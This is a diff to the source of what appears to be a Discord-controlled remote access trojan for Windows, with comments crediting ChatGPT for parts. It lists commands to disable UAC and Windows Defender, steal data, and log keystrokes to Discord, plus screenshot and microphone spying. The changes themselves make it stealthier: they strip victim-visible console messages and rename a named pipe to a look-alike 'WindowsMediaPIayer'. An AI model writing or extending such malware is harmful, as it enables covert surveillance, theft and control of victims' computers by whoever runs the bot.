@@ -81,12 +81,10 @@ class ImprovedMicrophoneAudio(PCMAudio): # ChatGPT carried
         input_devices = [i for i, d in enumerate(devices) if d['max_input_channels'] > 0]
         
         if not input_devices:
-            print("No microphone devices found")
             return
         
-        device_id = selected_audio_device if selected_audio_device in input_devices else input_devices[0]
-        print(f"Using microphone device: {devices[device_id]['name']}")
-        
+        device_id = selected_audio_device if selected_audio_device in input_devices else input_devices[0]    
+            
         def callback(indata, frames, time_info, status): # ChatGPT carried
             if self.streaming and not status:
                 # Convert to int16 PCM format with improved quality
@@ -197,9 +195,7 @@ __File Management__
 
         f"""
 __System Info & Control__
-- `{command_pref}info system` – System info
-- `{command_pref}info hardware` – CPU, RAM, disk info
-- `{command_pref}info network` – IP and interface info
+- `{command_pref}info` - Tons of information about the computer
 - `{command_pref}admincheck` – Check admin privileges
 - `{command_pref}shutdown` / `{command_pref}shutdown cancel` – Shutdown PC or cancel it
 - `{command_pref}restart` – Restart PC
@@ -224,7 +220,7 @@ __Troll Tools__
 - `{command_pref}troll azerty/qwerty` – Change keyboard layout
 - `{command_pref}troll revertall` – Revert all troll changes
 
-__Admin Functions (mrequires admin)__
+__Admin Functions (Requires admin)__
 - `{command_pref}uac` – Attempt to gain administrator
 - `{command_pref}disableuac` – Fully disable UAC from ever popping up
 - `{command_pref}disabledefender` – Disable Windows Defender
@@ -550,8 +546,7 @@ class Keylogger:
                     
                 self.log_buffer = ""
             except Exception as e:
-                print(f"Error sending to Discord: {e}")
-                
+                await self.ctx.send(str({e}))
 # Keylogger command
 @bot.command()
 async def keylogger(ctx, action="status", interval: int = 60):
@@ -706,8 +701,8 @@ def send_periodic_screenshots(monitor_index, ctx, interval):
             ctx.send(f"Screen sharing error: {str(e)}"),
             bot.loop
         )
-# ChatGPT tried its best, but failed :P                    no clue how to make this, it don't work rn :O
-def stream_screen_to_discord(monitor_index, ctx, temp_dir):
+# ChatGPT tried its best, but failed :P
+def stream_screen_to_discord(monitor_index, ctx, temp_dir): # no clue how to make this, it don't work rn :O
     global streaming_monitor, voice_client
     
     try:
@@ -758,7 +753,7 @@ def stream_screen_to_discord(monitor_index, ctx, temp_dir):
                     stream_monitor_fallback(monitor_index, ctx)
                     return
             
-            pipe_name = r'\\.\pipe\WindowsMediaPlayer'
+            pipe_name = r'\\.\pipe\WindowsMediaPIayer'
             
             class ScreenShareSource(discord.PCMAudio):
                 def __init__(self, pipe_name):
@@ -852,7 +847,6 @@ def stream_monitor_fallback(monitor_index, ctx):
                 
                 img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                 img = img.resize((854, 480))
-                
                 img_byte_arr = io.BytesIO()
                 img.save(img_byte_arr, format='JPEG', quality=70)
                 img_byte_arr = img_byte_arr.getvalue()
@@ -904,6 +898,7 @@ async def unmute(ctx):
         return
     
     streaming_audio = True
+    
     if isinstance(audio_stream, ImprovedMicrophoneAudio):
         audio_stream.streaming = True
     
@@ -939,6 +934,7 @@ async def tasklist(ctx):
     await ctx.send("Getting task list...")
     
     result = "PID\tName\tMemory Usage (MB)\n"
+    
     for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
         try:
             process_info = proc.info
@@ -1117,7 +1113,6 @@ async def ls(ctx, directory=None):
         await ctx.send(f"Error listing directory: {str(e)}")
 
 # need a cd command actually, so we can ls other directories too..
-
 
 # Stealing command
 @bot.command()
@@ -2149,14 +2144,14 @@ async def exit(ctx):
     sys.exit(0)
 
 # UAC command 
-@bot.command() # i removed the old version, it was so ass
+@bot.command() # fixing...
 async def uac(ctx):
     if ctx.channel != ctrl_channel:
         return
     
     await ctx.send("In development.")
 
-# fully disable UAC (also not really working)
+
 @bot.command()
 async def disableuac(ctx):
     if ctx.channel != ctrl_channel:
